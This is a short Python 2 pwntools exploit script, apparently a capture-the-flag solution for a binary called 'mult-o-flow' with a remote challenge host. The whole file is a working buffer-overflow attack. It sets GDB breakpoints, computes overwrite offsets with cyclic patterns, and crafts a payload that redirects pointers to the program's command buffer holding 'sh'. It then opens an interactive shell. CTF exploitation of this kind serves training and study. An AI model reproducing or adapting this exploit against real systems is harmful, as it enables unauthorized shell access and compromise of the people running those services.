#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

context(arch='i386', os='linux', aslr=False, terminal=['tmux', 'neww'])

if args['GDB']:
    io = gdb.debug(
        './mult-o-flow',
        gdbscript='''\
        set follow-fork-mode parent

        b *0x48A37
        commands
            set $spbuf=$ebp-0x414
            set $entry=$ebp-0x214
        end
        b *0x48A5E

        b *0x48ac3
        b *0x48A98
        c
    ''')
    elf, libc = io.elf, io.libc
elif args['REMOTE']:
    io = remote('flatearth.fluxfingers.net', 1746)
    elf, libc = ELF('./mult-o-flow'), None
else:
    io = process('./mult-o-flow')
    elf, libc = io.elf, io.libc

io.recvuntil('What is your name, sir?\n> ')
io.send('sh' + '\x00' * 62)

io.recvuntil('feed me some location tables :-)\n')
io.send(
    fit({
        cyclic_find('buda') - len("ISP:") - 9: 'ISP:',
        cyclic_find('bzga') - len('City:') - 9: 'City:',
        cyclic_find('bzha'): p32(0xff112233)[:3] + '<',  #  set to zero in 1st extract_table_entry()
        cyclic_find('bzma'): p32(elf.symbols['cmd'])[:3] + '<',  # set to zero in 2nd extract_table_entry()
        cyclic_find('bzoa'): p32(elf.symbols['player']),  # address of 'sh\x00'
    }))

io.interactive()
